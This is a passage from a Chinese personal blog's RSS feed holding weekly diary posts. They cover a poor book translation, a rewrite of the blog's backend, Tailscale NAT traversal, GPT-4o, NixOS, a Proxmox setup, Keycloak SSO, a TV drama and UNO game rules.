&lt;p&gt;对照着英文版才发现，中文充斥了大量语言不通、错译。例如，《事实，虚幻，与我们的概率性世界》（Fact, Fiction, and Our Probabilistic World）这一章节里：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;即便有着测量的误差，行星还是没有按照定律精密而准确地运行。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;英文原版是：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Planets didn&apos;t follow laws with exact precision, even after accounting for measurement error.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;使用任何翻译软件，都能翻译出「accounting for」是「考虑到」的意思；任何一个&lt;strong&gt;学过英语且智力正常&lt;/strong&gt;的人，也都知道这里「accounting for」是「考虑到」的意思；正常的翻译应该是「即便考虑到测量的误差」，而作者偏偏将此处翻译成「即便有着测量的误差」。这句主语是「行星」，什么叫「行星有着测量的误差」？原文此处想要表达的是行星不精确运行是在考虑了测量误差之外的，而译者这么翻译容易让人误以为行星是由于测量误差，没有被观测到准确精密地运行。&lt;/p&gt;
&lt;p&gt;本书充斥着大量这样质量的翻译。我实在无法想象，什么样的情况下会产生这样烂的翻译。&lt;/p&gt;
&lt;p&gt;上一期《&lt;a href=&quot;https://skywt.cn/blog/weekly-1/#📚-有好的译者是书籍的幸运&quot;&gt;📚 有好的译者，是书籍的幸运&lt;/a&gt;》提到，「&lt;strong&gt;一个缺乏翻译素养的译者，其作品所造成的文化损失绝对不亚于一般的经济犯罪和刑事犯罪。&lt;/strong&gt;」我将其与建筑设计相比较。然而，现在想想，缺乏翻译素养的译者的作品造成的文化损失，比缺乏艺术修养的建筑设计师造成的文化损失更甚：出版社买下了本书的独家版权，意味着几年内不会有更好的译本出版；如此多的中文母语者，多少人读了中文译本望而却步，其中导致了多么宝贵的文化的流失，特别是对于这样一部伟大的作品！&lt;strong&gt;这简直是严重的经济犯罪和刑事犯罪。&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;✨ 博客系统更新日志&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;全新重构博客后端。&lt;/strong&gt;之前基于 Sequelize ORM 和 SQLite，然而 Sequelize ORM 对 TypeScript 的支持并不好，SQLite 也不方便拓展。这次彻底用 TypeORM 和 Postgres 重构了后端。也重新设计了 API 使其更符合 RESTful 标准。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;前端根据 BEM 命名规范重构所有 CSS。&lt;/strong&gt;如果说 Tailwind 适合绘制 Web App 的 UI，那么 BEM 更适合构建大型的、存在较多样式复用的网页项目。代码组织的最佳实践总能给人一种优雅的感觉。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;下周见！&lt;/p&gt;
</content:encoded><author>me@skywt.cn</author></item><item><title>Weekly #1：一半科学，一半艺术</title><link>https://skywt.cn/blog/weekly-1/</link><guid isPermaLink="true">https://skywt.cn/blog/weekly-1/</guid><description>以后这个周记就统一每周一发布吧。因为周末的时间安排无法控制……

</description><pubDate>Mon, 20 May 2024 07:00:00 GMT</pubDate><content:encoded>&lt;p&gt;以后这个周记就统一每周一发布吧。因为周末的时间安排无法控制……&lt;/p&gt;
&lt;!--more--&gt;
&lt;h2&gt;🌆 封面图：夏天的早晨&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/05/1068344980.jpg&quot; alt=&quot;夏天的早晨&quot;&gt;&lt;/p&gt;
&lt;p&gt;我太喜欢复临舍的玻璃幕墙了！也很喜欢夏天。也很喜欢早晨。&lt;/p&gt;
&lt;h2&gt;🎨 构建 REST API：part art，part science&lt;/h2&gt;
&lt;p&gt;在学习 &lt;a href=&quot;https://www.restapitutorial.com&quot;&gt;REST API Tutorial&lt;/a&gt; 的时候，教程提到：构建 RESTful 网络服务是&lt;strong&gt;「part art，part science」&lt;/strong&gt;，即「一半科学，一半艺术」。我认为这不仅适用于形容 RESTful API，也适合形容技术世界里的一切。&lt;/p&gt;
&lt;p&gt;许多人对艺术的印象就是需要动用感性的人文领域，似乎和计算机这个需要极强理性的科学领域不太搭边。然而，很多时候，当我设计一个优雅的程序架构的时候，当我用更简洁的方式重构代码的时候，当我实践 stateless 的理念来管理容器的时候，或者当我设计诸如 RESTful API 的时候，我是真真切切能够感觉到这是一门艺术。很多时候，当我了解到一些新的理念、设计和实践，会在心里默默感叹：「太优雅了！」&lt;/p&gt;
&lt;p&gt;我们学了很多「计算机科学」，但是似乎很少专门地去学&lt;strong&gt;「计算机艺术」&lt;/strong&gt;。事实上，我认为在技术的庞大世界里，科学和艺术同样重要。&lt;/p&gt;
&lt;p&gt;或许是由于我强烈的感性思维，我突然觉得，「计算机艺术」似乎就是一直以来令我深深着迷的那一部分。&lt;/p&gt;
&lt;h2&gt;🌐 Tailscale 的 NAT 穿透原理&lt;/h2&gt;
&lt;p&gt;本周更新了 Tailscale 的配置。将其接入了之前部署的 Keycloak SSO，并开启了 DERP 等功能，尽量发挥 Headscale 的全部功能。&lt;/p&gt;
&lt;p&gt;本来还希望配置一个 all-in-one 的 VPN，集成网络代理和自己的 DNS。可惜没有我理想中的 fancy 的方案。改天也要写一篇博客文章讲一讲我的配置。（可恶，挖的坑越来越多了……）&lt;/p&gt;
&lt;p&gt;以前一直以为 Tailscale 是通过服务器中转流量，所以一直对其性能不抱希望。今天看了官方的文档，才知道原来并不是。Tailscale（在大多数情况下）&lt;strong&gt;直接建立主机之间的点对点连接&lt;/strong&gt;。其核心就是 NAT 穿透技术。&lt;/p&gt;
&lt;p&gt;官方的这两篇科普文章，质量非常高。尤其是讲 NAT 穿透的第二篇，用非常风趣和通俗易懂的语言讲清楚了 NAT 穿透基本的原理、应对种种复杂的网络环境的解决方案。非常推荐阅读！&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://tailscale.com/blog/how-tailscale-works&quot;&gt;How Tailscale works&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://tailscale.com/blog/how-nat-traversal-works&quot;&gt;How NAT traversal works&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;简单来说，为了穿透 stateful 防火墙，Tailscale 设立 &lt;strong&gt;coordinate 服务器&lt;/strong&gt;，协调两个主机几乎同时向对方发包，并定时维持、重新建立连接；为了穿透 NAT，向外部的 &lt;strong&gt;STUN 服务器&lt;/strong&gt;查询，获取本机 NAT 后的 source；为了解决所谓的 hard NAT，即某些 NAT 对不同目的地分配不同的 source 的问题，使用&lt;strong&gt;生日悖论&lt;/strong&gt;的原理一次发起多个连接并查找我们要的连接，或者配置&lt;strong&gt;端口映射&lt;/strong&gt;，或者使用 &lt;strong&gt;DERP 服务器&lt;/strong&gt;；为了解决某些网络完全禁止 UDP 的问题，或者对于无法配置端口映射的多级 NAT 或运营商 NAT，使用 &lt;strong&gt;DERP 服务器&lt;/strong&gt;用 HTTP 协议中转流量；同时还要解决 hairpinning 和 IPv6 带来的问题……最后使用 &lt;strong&gt;ICE 协议&lt;/strong&gt;，尝试上述所有方法，使用表现最佳的方法。&lt;/p&gt;
&lt;p&gt;在第一篇文章开头，文章提出「读完本文后，你也可以自己实现一个 Tailscale 的替代品！」然而真正读完之后，本文成功地使人打消了这个念头。😇&lt;/p&gt;
&lt;p&gt;在这个方面，国内的大厂似乎很少发布像这样高质量的技术文章。Google、Cloudflare、Tailscale 都有多少高质量的技术文章，而纵使阿里云、腾讯云都在大张旗鼓地建立所谓的社区，但基本都成了内容农场，其中 99% 的文章质量还不如 CSDN。推荐阅读：《&lt;a href=&quot;https://mp.weixin.qq.com/s/XZqe4tbJ9lgf8a6PWj7vjw&quot;&gt;牙膏云？您可别吹捧云厂商了&lt;/a&gt;》。好骂！&lt;/p&gt;
&lt;h2&gt;🤖 GPT4o：AI 带来的情绪价值&lt;/h2&gt;
&lt;p&gt;这次 GPT4o 的更新，给我带来最大震撼的是 GPT 的语音合成。至于更新的图像识别功能，我认为随着计算机视觉的发展，早晚会有的；但是 GPT4o 语音加入的语气、情绪和笑声，给了我很大惊喜。这一切都太真实了。&lt;/p&gt;
&lt;p&gt;特别是这个视频：&lt;a href=&quot;https://vimeo.com/945587911&quot;&gt;Happy Birthday&lt;/a&gt;。GPT4o 唱生日歌庆祝用户的生日，它的这种情绪，就好像用户是在和一个很要好的朋友视频通话。这狠狠地戳中了我的情绪价值 🥲。&lt;/p&gt;
&lt;p&gt;或许可以说，又一个科幻电影里的场景成真了。说实话，这种情绪效果，之前任何人机交互中，我从未体验到过。不管是 Siri、小爱同学还是各类其他语音助手，或者是 ChatGPT 等等各类以文字交互的 AI，从来只是更新了传递信息的方式，&lt;strong&gt;从来没有成功地传达过感情&lt;/strong&gt;。可是 GPT4o 成功地做到了。&lt;/p&gt;
&lt;h2&gt;📚 有好的译者，是书籍的幸运&lt;/h2&gt;
&lt;p&gt;我必须强烈推荐一下 HNU 读书馆的&lt;strong&gt;「新书闪借」&lt;/strong&gt;服务！在一个类似网店的地方下单新书，直接快递发货寄到填的地址（宿舍或者家里），图书馆出钱，连运费都不用我们出。只要 30 天内归还给图书馆或者续借即可。相比传统的「图书荐购」，新书闪借的方式反馈快，新书一两天就能到我们手上。非常适合借阅出版社新出的书。通过这种方式，我已经借了《JavaScript 高级程序设计（第 4 版）》《计算》《我看见的世界》三本书。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;《我看见的世界》&lt;/strong&gt;（The Worlds I See）是华裔科学家李飞飞的自传，最近新出的中文版。李飞飞女士在青少年时代随家人移民美国，经历了艰苦的求学道路，最终成长为计算机视觉领域顶尖的科学家。她的经历非常传奇。&lt;/p&gt;
&lt;p&gt;在看这本书的豆瓣页面的时候，发现本书译者赵灿女士的评论《&lt;a href=&quot;https://book.douban.com/review/15864705/&quot;&gt;如何翻译一本女性传记&lt;/a&gt;》。点进她的个人主页一看，原来之前我看的《乔布斯传》和《纳瓦尔宝典》都是她翻译的！对这两本书，她分别发表了《&lt;a href=&quot;https://book.douban.com/review/15457189/&quot;&gt;如何翻译一本传世之作&lt;/a&gt;》《&lt;a href=&quot;https://book.douban.com/review/14896096/&quot;&gt;如何翻译一本思想盛宴&lt;/a&gt;》两篇评论，讲述她翻译过程中的一些经历和体会。从中可以体会到，高水平译者带来的好的翻译，对于书籍内容的传播有多么重要。&lt;/p&gt;
&lt;p&gt;对于这一点，更深的体会其实发生在阅读大量的翻译非常烂的外文书籍过程中。赵灿女士提到：「（《乔布斯传》）当年为了中英文版本同时上市，中信通过『海选』的方式找了 5 名译者，用 1 个月的时间完成了中文版，由于各种限制条件，这一版在准确度、流畅性、一致性等各方面均有改进空间。」而相比之下更加不负责任的出版社比比皆是。之前在读《掌控谈话》这本书的时候就狠狠地吐槽过，有些句子我不得不去找来英文原版去看才能 get 到表达的意思。其实很多时候，我们读译书觉得读不下去、晦涩难懂，都是翻译的锅。&lt;/p&gt;
&lt;p&gt;不禁想起《岳麓讲坛》每学期第一期，陈飞虎老师在介绍建筑艺术的时候，都会说这样一句话：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;一个缺乏艺术修养的建筑设计师，&lt;strong&gt;其作品所造成的文化损失绝对不亚于一般的经济犯罪和刑事犯罪&lt;/strong&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我很喜欢这句话。在此处，我也认为：&lt;strong&gt;一个缺乏翻译素养的译者，其作品所造成的文化损失绝对不亚于一般的经济犯罪和刑事犯罪。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;希望能有更多像赵灿女士这样高水平且负责的译者。这些优秀的书籍能由他们翻译出版，真的非常幸运。&lt;/p&gt;
&lt;h2&gt;🛠️「君子不器」：不要成为「器」&lt;/h2&gt;
&lt;p&gt;本周去听了《大麓开讲》系列讲座第二期，主题是「君子不器：从『工具人』到『创造者』」。&lt;/p&gt;
&lt;p&gt;第一次来岳麓书院内部的教室里听讲座。岳麓书院每天的游客络绎不绝，我们之前都很难想象这居然真的是咱们的一个学院。当游客在门口忙着扫码填信息购票、找身份证入园的时候，我们直接刷校园卡，潇洒地进入了景区 😎。&lt;/p&gt;
&lt;p&gt;本次主讲嘉宾是岳麓书院的陈仁仁教授、物电院院长文双春教授。&lt;/p&gt;
&lt;p&gt;我们高中学《论语》的时候就学过：&lt;strong&gt;「子曰：『君子不器。』」&lt;/strong&gt;对「器」这个字，比较通行的解释是「拘泥于一物」，可以理解为不能拘泥于特定的专业领域。按照我的理解，具体来说：1）不能拘泥于自己所学专业的狭窄知识，要学习更多通识性的、可迁移的知识技能；2）不能只限于具体知识的学习，也应该注重品德修养。&lt;/p&gt;
&lt;p&gt;确实，当前社会越来越「卷」的趋势下，竞争越来越激烈，&lt;strong&gt;社会越来越要求人成为「器」&lt;/strong&gt;。要保研或者考研，只关心你这几门课考试成绩排名，读研只要你能干活、发论文，没有人关心你对科学的理解、敬仰和热爱；要找工作面试，只问你 React 的原理，没有人关心你渴望创造产品的满腔热情，以及从技术中体会到的那些精神。这正是马克思所说的：在工作中，&lt;strong&gt;人被异化成了物&lt;/strong&gt;，也就是孔子所说的「器」，也就是所谓的「工具人」。&lt;/p&gt;
&lt;p&gt;诚然，这是经济发展、社会分工的必然，也是社会资源不足、分配不合理的结果。然而，这都是我们无法改变的现状，我们只能改变自己应对这个世界的方式。我们不能单单顺应社会的要求，真的只把自己培养成工具人。&lt;strong&gt;这个世界有更多东西值得我们去探索。&lt;/strong&gt;我认为这就是「君子不器」在当下的指导意义。&lt;/p&gt;
&lt;p&gt;这让我想起宫崎骏的&lt;strong&gt;《千与千寻》&lt;/strong&gt;。千寻被夺走了名字（进大厂要取花名），小白说：「不要忘记自己的名字。忘记了自己的名字，就会忘记自己的过去。」很难想象，多年之后的我，会成为所谓的「器」吗？我还会记得曾经青春的激情、热爱和梦想吗？&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;曾经发生过的事情是不可能忘记的，只是一时想不起来罢了……&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;🌸《繁花》中的极致 BE 美学&lt;/h2&gt;
&lt;p&gt;前段时间重温了之前看过的&lt;strong&gt;《繁花》&lt;/strong&gt;。实在是太喜欢这部剧里极致的 BE 美学了！（名词解释：BE：Bad Ending；HE：Happy Ending）&lt;/p&gt;
&lt;p&gt;我最喜欢的一幕之一，是 29 集里阿宝和玲子在医院见面并告别的那一幕。不同于一般剧里感情戏的扭扭捏捏，当玲子说出那句「不讲了」，她个性中的坚强充分展现。但最后玲子的欲言又止，加上配乐和葛老师的画外音，却又非常令人触动。王导你太会了！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/05/1969235801.png&quot; alt=&quot;她心里永远会记得……&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我是过来人，其实感情这样东西，是这样。譬如讲两个人讲好一起去逛庙会，两个人讲好的，长夜漫漫，一直游玩到天亮。结果这个朋友有事情走掉了，他也找了另外一个同伴，继续游玩下去。但是，他心里厢永远会记得，和前头那个人一道，看过，讲过，笑过……&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;（上海话属于吴语方言，和我老家的方言很像，比如我们说「里面」经常会说「里厢」，看了《繁花》字幕才知道原来这个词是这么写的）&lt;/p&gt;
&lt;p&gt;正如一些点评所说的那样，&lt;strong&gt;《繁花》这部剧讲的不是小情小爱&lt;/strong&gt;。它展现的是那个时代的人物群像。如果关注感情线，可以发现剧中全部都是 BE，从最初主角们坐在一张桌子前吃饭唱歌，到最后人走茶凉，各奔东西，实在令人唏嘘。我实在太喜欢这种凄美的 BE 设定了，这种设定更加深刻地揭示了人物成长。（相比之下，如果是最终 X 和 Y 在一起了的 HE 大团圆结局，显然会降低整部剧的深度）&lt;/p&gt;
&lt;p&gt;这种 BE 美学，让我想到新海诚的&lt;strong&gt;《秒速五厘米》&lt;/strong&gt;：男主和女主长大了，都有了自己的人生，然而年少时的爱恋埋藏在他们的心底，终其一生都无法忘怀。是呀，人生的旅途里有多少擦肩而过的遗憾。然而曾经有某个人和我们一道看过，讲过，笑过，留在我们的记忆中，这就足够了。&lt;/p&gt;
&lt;h2&gt;⚙️ CloudBeaver：可自托管的在线数据库管理&lt;/h2&gt;
&lt;p&gt;每个月逛一次 &lt;a href=&quot;https://github.com/awesome-selfhosted/awesome-selfhosted&quot;&gt;Awesome Self-hosted&lt;/a&gt;，每次都有新感觉！&lt;/p&gt;
&lt;p&gt;本周部署了基于 Web 的数据库管理软件 &lt;strong&gt;CloudBeaver&lt;/strong&gt;，它是 DBeaver 同一个公司做的 Web 版本，官网上免费的 community 版本入口隐藏很深。它支持多种数据库，因此可以全面取代 phpMyAdmin、pgAdmin 等专门的数据库管理软件。部署在 &lt;a href=&quot;https://dbms.skywt.cn&quot;&gt;dbms.skywt.cn&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;以及我发现，如果要设计博客系统管理员用的后端 API，需要的只有文章和评论的 CURD，这和在数据库里直接编辑数据不是一样么……所以目前直接去数据库里发博客了。😁&lt;/p&gt;
&lt;p&gt;下周见～&lt;/p&gt;
</content:encoded><author>me@skywt.cn</author></item><item><title>Weekly #0：每个平凡的日子，都在闪闪发光</title><link>https://skywt.cn/blog/weekly-0/</link><guid isPermaLink="true">https://skywt.cn/blog/weekly-0/</guid><description>## 📰 发刊词：每个平凡的日子，都在闪闪发光

这是我博客的一个新的系列。之前类似的内容发在 whisper.skywt.cn，不过后来由于某些原因没有再更新了。然而，我还是觉得生活中经常有些有意思的事情，值得记录和分享。所以，现在打算以周记的形式发布。

**我们的青春岁月如同列车呼啸而过。我们每一天的所听、所见、所思、所想，都在让我们一点点增进对这个世界的了解。我认为这一切都非常值得被记录下来。**

&gt; 每个平凡的日子，都在闪闪发光。

</description><pubDate>Sun, 12 May 2024 08:30:00 GMT</pubDate><content:encoded>&lt;h2&gt;📰 发刊词：每个平凡的日子，都在闪闪发光&lt;/h2&gt;
&lt;p&gt;这是我博客的一个新的系列。之前类似的内容发在 whisper.skywt.cn，不过后来由于某些原因没有再更新了。然而，我还是觉得生活中经常有些有意思的事情，值得记录和分享。所以，现在打算以周记的形式发布。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;我们的青春岁月如同列车呼啸而过。我们每一天的所听、所见、所思、所想，都在让我们一点点增进对这个世界的了解。我认为这一切都非常值得被记录下来。&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;每个平凡的日子，都在闪闪发光。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;!--more--&gt;
&lt;p&gt;目前这个周记的定位并非提供知识的周刊 / 周报 / Newsletter，所以对内容价值没有任何保证。可能是技术相关的，可能是最近发生的有趣的事情，也可能是各种天马行空的想法。本来，是想给每期划定各个模块的，比如「学习」、「阅读」、「见闻」之类。不过觉得这种内容框架过于死板了，因为每周都有不一样的安排。只有唯一相同的是，每周都有值得记录的事情。所以，现在的内容规范是：想说什么就说什么。&lt;/p&gt;
&lt;p&gt;这个系列还没想好一个好听的名字，暂时就叫做「Weekly」。不过我也不能保证每周都能更新。总之作为一个长期的全新系列，希望能坚持记录。&lt;/p&gt;
&lt;p&gt;（注：本节标题「发刊词」带有比喻意义，该文章系列仅为个人博客文章，并非正式出版物）&lt;/p&gt;
&lt;h2&gt;🌆 封面图：一缕晨光&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.skywt.cn/usr/uploads/2024/05/1318381461.jpg&quot; data-fancybox data-caption=&quot;封面图：一缕晨光&quot;&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/05/1318381461.jpg&quot; alt=&quot;封面图：一缕晨光&quot; style=&quot;width:60%;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;阳光灿烂的早晨，在中楼拍的。&lt;/p&gt;
&lt;h2&gt;🔬 人文社科中的科学精神&lt;/h2&gt;
&lt;p&gt;本学期选了一门法学院的专业选修课，高中老师的《西方法律思想史》。大学里上的所有课里，真正让我感觉有很大收获的课其实非常少，但是这门课是其中之一。能上到这样的课，感觉还是挺幸运的。&lt;/p&gt;
&lt;p&gt;高老师说了这样一个观点：我们（他们）法律人实际上是 &lt;strong&gt;social engineer&lt;/strong&gt;，即「&lt;strong&gt;社会工程师&lt;/strong&gt;」。法律人是通过法律建构出这个社会的形态。&lt;/p&gt;
&lt;p&gt;仔细想想，其实这和我们「软件工程师」很像！只是我们构建软件的工具是代码，他们构建社会的工具是法律。纵观整个西方法律思想史，从一种观点发展到另一种观点，理性总是法律思想发展的工具。从这个角度看，怎么能说法学这类是「文科」呢？明明和我们软件开发一样，需要严谨的逻辑思维和表达。&lt;/p&gt;
&lt;p&gt;进一步想想，法律条文不也是一种接近于形式化的语言吗？相比自然语言，法律条文似乎更像代码：晦涩但严谨清晰。这么看来，制定法律条文这一过程，甚至和我们写代码也有些相似。&lt;/p&gt;
&lt;p&gt;所以，是谁一直散播「人文社科不需要逻辑思维，更需要感性思维」这类的观点的？对于文学一类的专业或许成立，但是对社科这类的专业而言，这类观点甚至对这个专业的人才输送产生了非常不好的影响。联想到最近看到马督工的《&lt;a href=&quot;https://www.bilibili.com/video/BV1GN4y1h7Ex&quot;&gt;【睡前消息682】支持张雪峰批文科，没有独立性哪有尊严&lt;/a&gt;》，他认为，近来在文科领域盛行脱离科学的风气，对科学精神的重视严重不足。回想我们高中时期，确实是家长和老师都认为「理科学不好的才去学文科」。而马督工认为，这才是反过来导致文科整体走向低端，被歧视的原因。&lt;/p&gt;
&lt;h2&gt;🃏 一起优诺！UNO 纸牌的魅力&lt;/h2&gt;
&lt;p&gt;五一期间逛 App Store 看到「&lt;strong&gt;一起优诺&lt;/strong&gt;」这个游戏，就是我们小学玩的 UNO 纸牌的官方手游。于是心血来潮下载体验了一下。&lt;/p&gt;
&lt;p&gt;相比我们小时候玩的纸牌版本，游戏的「经典模式」加入了两条规则：1）每局限时 3 分钟，每次出牌限时 10 秒；2）玩家打出 +4 牌，下家可以选择「质疑」。如果玩家出 +4 之前其实有同色的牌可出而不出，则质疑成功，玩家拿六张牌，下家不加牌；如果质疑失败，下家拿六张牌。如果不质疑，下家拿四张牌。&lt;/p&gt;
&lt;p&gt;而游戏推出的「欢乐场模式」则更加刺激，添加的规则是：1）增加「同色全出」牌，出此牌即可一次全出同色所有牌；2）上家出 +2 或 +4 牌，玩家可以出 +2/+4 牌叠加给下家。&lt;/p&gt;
&lt;p&gt;这个游戏还有金币系统，一局结束后，输家将给赢家金币。在不同倍率的场次，输赢金币数量不同。&lt;/p&gt;
&lt;p&gt;在多轮体验之后，感觉这个游戏规则有一个显著特点：&lt;strong&gt;非常看牌运，决策空间其实很小。&lt;/strong&gt;玩家初始只有 7 张牌，由于有上家的 +2/+4 牌、禁止牌等等的存在，很容易出现连续几轮没有出牌机会或者被一直加牌的情况，能够导致有强力牌的玩家连续掌控牌权；单人模式中能攻击的只有下家，所以决策的唯一选择是：&lt;strong&gt;永远对下家造成最大的伤害&lt;/strong&gt;。决策空间小，就导致随机变数大，即使再技术高超的玩家也无法保证高胜率。（所以，我多次累积到 1w+ 金币，又多次破产 😭）&lt;/p&gt;
&lt;p&gt;那为何这种缺乏决策空间的游戏能够风靡全球呢？我认为主要是由于其游戏规则带来的牌局的&lt;strong&gt;戏剧性和刺激感&lt;/strong&gt;。和传统纸牌游戏不同的是玩家能够被动增加手牌，只剩一两张牌的玩家可以突然被加上六张牌。特别是在「欢乐场模式」中，同色全出牌和 +2/+4 可叠加两条规则，让出牌和加牌的规模都增加了，相当于增加了持牌数量的方差，使牌局更加戏剧化。所以，在玩的过程中会非常欢乐。比如下图，我出了一张 +4，结果在场每个玩家都跟了 +4，轮到我成了 +16，我一下拿了 16 张牌，手牌已经叠得看不清了 😭&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/05/3541340898.png&quot; alt=&quot;被加了十六张牌的我&quot;&gt;&lt;/p&gt;
&lt;p&gt;事实上，&lt;strong&gt;手游加入的两条规则，是在为游戏增添策略元素&lt;/strong&gt;。1）通过「质疑」，玩家可以怀疑此次 +4 是否是为提供对手出牌条件而「战略性」出牌；2）限时规则中，当 3 分钟时间到时，如果没有牌出完的获胜方，则根据所有玩家持牌扣分，普通牌扣排面数字对应的分值，而功能牌则扣分幅度大得多（印象中 +4 牌一张扣 50 分），这导致在牌没出完的情况下&lt;strong&gt;优势逆转&lt;/strong&gt;（如果此时继续出牌，显然功能牌多的玩家更更可能赢），所以在牌局中玩家需要决策当前是否可能出完手牌，如果时间内已经不可能则要优先出功能牌（这可能又会被「质疑」）；甚至到快结束的时候玩家可以战略性地减慢出牌速度（拖时间），减少对方的机会……不过相比其他纸牌游戏，即使加入了规则，决策空间依然很小。&lt;/p&gt;
&lt;p&gt;以前一直认为，一种游戏长盛不衰的原因一般是由于其&lt;strong&gt;为高端玩家提供了足够的决策空间&lt;/strong&gt;，即在竞技性方面有很高的上限，比如围棋。然而，很多游戏更多提供的是&lt;strong&gt;社交属性&lt;/strong&gt;，例如 UNO 纸牌这种戏剧性和刺激感的特点，非常适合好友聚会的欢乐氛围。这或许才是它能够风靡全球的原因，&lt;/p&gt;
&lt;h2&gt;🎛️ 无状态 Stateless 的优雅性&lt;/h2&gt;
&lt;p&gt;周六被桂总狠狠地传教了 NixOS。在面对其陡峭的学习曲线望而却步的同时，确实被它的优雅性所深深折服。&lt;/p&gt;
&lt;p&gt;本质上 NixOS 的理念有点像 Docker，即&lt;strong&gt;将每个软件本身视为无状态的，通过外部的配置文件显式地管理其状态&lt;/strong&gt;。每次启动计算机，所有软件都处于被用户控制的初始状态。&lt;/p&gt;
&lt;p&gt;这种感觉实在是太酷了！在以前，我们使用计算机的时候往往觉得这是一个巨大的黑盒，比如在 Firefox 中登录了账户，相比没有登录账户，存储部分产生了什么变化呢？我们根本不知道。这导致我们无法随心所欲地控制软件的状态，比如我们希望这次启动 Firefox 是在未登录状态下启动的，我们只能使用 Firefox 软件提供的接口（在设置中退出登录），而没有一种统一的接口控制这一状态。&lt;/p&gt;
&lt;p&gt;而有了外部的状态管理，就可以在一个配置文件中管理 Firefox 的状态。根据类似的原理，能够通过配置文件管理整个系统的状态。使用的软件包、启动的选项，等等。没错，NixOS 中整个系统的状态都是由一个配置文件表示的。这样，每次系统启动时，各个组件是什么样子，我们都能够控制了。&lt;strong&gt;计算机对于我们来说再也不是一个黑盒了。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;React 之前推出的「函数式组件」也使用了「组件无状态」的思想。&lt;/p&gt;
&lt;p&gt;正由于这种优雅性，我很早就将服务器上所有部署的服务容器化，使用 Docker Compose，通过将数据挂载到外部，实现全面的「容器无状态」。然而，NixOS 能将这种状态管理做到如此的极致，以及其提供的强大简洁的工具链，着实震撼了我。&lt;/p&gt;
&lt;h2&gt;⚙️ 从零开始的 PVE 折腾之旅&lt;/h2&gt;
&lt;p&gt;上学期入手的零刻 Ser6 Pro Vest 迷你主机，一直装着 Windows 11 和 Kali 双系统，因为我既有使用 Windows 软件和玩游戏的需求，又有用 Linux 的需求。然而，这样只能同时运行一个系统，这意味着任何一个系统不能 24 小时在线，不能用来跑 NAS 或者其他服务。&lt;/p&gt;
&lt;p&gt;最近决定入这个大坑：&lt;strong&gt;Proxmox Virtual Environment&lt;/strong&gt;。这是一个开源的 Linux 发行版，提供了面向企业运维的虚拟化环境。在上面能够方便地配置 Windows 虚拟机和 Linux 容器，达到同时运行两个系统的目的。&lt;/p&gt;
&lt;p&gt;然而，我作为硬件方面的小白（在此之前连 PCI 是什么都不知道），折腾 PVE 真的能用名副其实的「折腾」作为动词。因为文档充斥着大量我不了解的概念，大多教程也只告诉你怎么做，没有过多的解释；不同硬件的情况也千差万别（比如 AMD Radeon 存在的 &lt;a href=&quot;https://github.com/inga-lovinde/RadeonResetBugFix&quot;&gt;reset bug&lt;/a&gt;），遇到了无数的坑。之后一定要写一篇博客记录一下。😭&lt;/p&gt;
&lt;p&gt;昨天终于配置好了核显直通。现在可以直接外接显示器玩 Minecraft 和 Cities: Skylines 之类的游戏了。之后打算尝试一下黑群晖，还要选购一块硬盘来存 NAS 的数据。这样或许可以逐渐抛弃 iCloud 云上贵州。或许还可以将服务器上一些非常耗费资源的 self-hosted 服务迁移到这台主机上。&lt;/p&gt;
&lt;p&gt;这种 all-in-one 的感觉真好。&lt;/p&gt;
&lt;h2&gt;🔐 使用 Keycloak 搭建统一登录平台&lt;/h2&gt;
&lt;p&gt;很多软件都需要用户登录鉴权。然而对于开发者来说，开发这样一个登录功能，不仅需要额外的数据模型，也有一堆安全方面的坑；对用户来说，同一个组织可能存在很多应用，如果他们都有独立的登录系统，用户的使用负担不小。&lt;/p&gt;
&lt;p&gt;所以就有了 SSO，即单点登录。对开发者，相当于将登录流程「外包出去」；对用户则是多个网站只要同一个账号密码即可登录。这是非常优雅的解决方案。&lt;/p&gt;
&lt;p&gt;本周我在服务器上部署了 Keycloak，这是 Red Hat 开发的开源的 SSO 软件，兼容 OIDC 等多种协议。非常好用，除了 UI 有点丑。&lt;/p&gt;
